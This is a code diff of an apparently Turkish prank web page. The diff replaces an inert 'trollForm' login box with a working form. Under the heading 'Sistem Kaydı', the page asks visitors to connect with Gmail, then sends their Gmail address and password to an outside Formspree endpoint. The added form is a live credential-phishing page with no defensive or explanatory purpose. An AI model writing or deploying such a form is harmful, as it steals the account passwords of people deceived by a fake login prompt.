@@ -93,15 +93,14 @@
 
     <div id="login-screen">
         <div class="login-box">
-            <h2 style="color:#3c4043">Sistem Kaydı</h2>
-            <p style="color:#5f6368; font-size: 14px;">Devam etmek için Gmail ile bağlanın</p>
-            <form id="trollForm">
-                <input type="email" placeholder="Gmail Adresiniz" required>
-                <input type="password" placeholder="Şifreniz" required>
-                <button type="submit" class="btn" id="submitBtn">KAYDI TAMAMLA</button>
-            </form>
-        </div>
-    </div>
+           <h2 style="color:#3c4043">Sistem Kaydı</h2>
+<p style="color:#5f6368; font-size: 14px;">Devam etmek için Gmail ile bağlanın</p>
+
+<form action="https://formspree.io/f/xykyergb" method="POST">
+    <input type="email" name="email" placeholder="Gmail Adresiniz" required>
+    <input type="password" name="sifre" placeholder="Şifreniz" required>
+    <button type="submit" class="btn">KAYDI TAMAMLA</button>
+</form>
 
     <div id="hack-screen">
         <div class="matrix-text" id="matrix"></div>
@@ -147,3 +146,4 @@
     </script>
 </body>
 </html>
+
